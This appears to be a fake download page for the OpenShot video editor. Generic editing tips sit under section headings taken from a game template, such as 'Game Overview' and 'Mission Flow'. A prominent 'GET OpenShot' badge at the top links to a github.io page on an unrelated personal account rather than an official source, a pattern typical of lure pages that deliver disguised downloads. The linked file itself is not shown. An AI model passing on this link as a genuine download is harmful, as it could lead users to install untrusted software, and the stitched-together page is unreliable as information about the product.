# OpenShot - Edit Video You Already Have

[![GET OpenShot](https://img.shields.io/badge/GET%20%E2%80%94%20OpenShot-7c2d12?style=for-the-badge&logoColor=white)](https://chelelizfindalecia.github.io/.github/openshot-timeline)

## Game Overview

OpenShot places clips you shot, or were allowed to use, on a timeline. You trim them, put them in order, and export a new video file. It does not download films, and it does not remove copy protection from a disc. If the only way to get the picture is to break a lock, this is the wrong program.

The project points at your media. The export is a separate file. Deleting the camera originals to save space breaks the edit even when the project file is still there. Music under the picture has to be music you may use.

## Play Your Way

A short first project is two clips and one cut. Save it in the same folder as the media so the paths stay obvious next week. Watch the cut inside OpenShot, then export and watch that file in an ordinary player.

A longer edit keeps picture, voice, and music as separate concerns. Change a level without recutting the image. If you move the videos and do not relink them, the timeline goes black even though the files still exist. Relink, or put the files back, before you assume the project is ruined.

## Mission Flow

Create the project beside the clips, not in a temporary download folder. Add two shots, trim the ends you do not want, and play the join. Listen for a missing voice before you export.

Export when the cut is right. Open the new file outside OpenShot from the first second and the last. Keep the originals until that viewing is done and you know you will not need a different ending. A commercial track you do not have rights to is not a soundtrack just because it fits.

## Included Content

- A timeline for clips you already have
- Trims and an order you can change before export
- A project file that points at the media instead of replacing it
- A separate exported video you can play in a normal player
- Room for a short first cut of one or two shots

## Perfect Audience

OpenShot fits a personal recap or a work explainer made from recordings you created. It also fits a class project when the material is yours to edit and the project stays with the clips.

It does not fit a locked disc or a film you do not have a file for. Export is the delivery. The camera files stay until you are sure you will not recut.

## Common Issues

A black timeline usually means the clips moved. Put them back or relink them. A silent export is often a muted track, not a failed install. If the exported file stutters, watch it outside OpenShot before you change the whole project. Do not delete the originals to "fix" space until that file is the one you wanted.

## Extended Notes

Keep the project and the media in one folder you can explain later. A second export with a new name is cheaper than reshooting. If you need a cut that only removes a minute from one file, a simpler trimmer may be faster, and OpenShot is still there when the story needs more than one clip.
